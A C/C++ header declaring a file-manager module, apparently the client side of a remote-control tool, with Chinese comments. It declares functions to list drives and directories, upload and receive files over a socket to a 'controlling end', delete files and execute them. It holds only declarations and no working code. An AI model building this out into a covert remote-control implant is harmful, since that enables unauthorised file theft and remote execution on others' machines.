#if !defined(AFX_FILEOPERATOR_H)
#define AFX_FILEOPERATOR_H

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000


#ifndef COMMAND_HEADER
#define COMMAND_HEADER
#include "Command.h"
#endif
#include <atlstr.h>
///////////////////////////////////////////////////////////
//
//发送硬盘信息
void FileListDirver(char *pBuf, LPMsgHead lpMsgHead);

//建立套接字与主控端交互发送 处理消息
DWORD MainFileManage();

 

//枚举文件路径
void FileListDirectory(char *pBuf, LPMsgHead lpMsgHead);

int fileToServer(char *pLocalPath, LPMsgHead lpMsgHead, SOCKET  FileSocket);


//文件删除
void fileDelete(char *pBuf);
void deleteDirectory(CString path);

//运行文件
void FileExec(char *pBuf, LPMsgHead);

// 接受文件
void recvClientFile(char *pLocalPath, LPMsgHead lpMsgHead, SOCKET  FileSocket);
/*
//粘贴文件
void FilePaste(char *pBuf, LPMsgHead lpMsgHead);

//从命名文件
void FileReName(char *pBuf, LPMsgHead lpMsgHead);
 */
#endif // !defined(AFX_FILEOPERATOR_H)
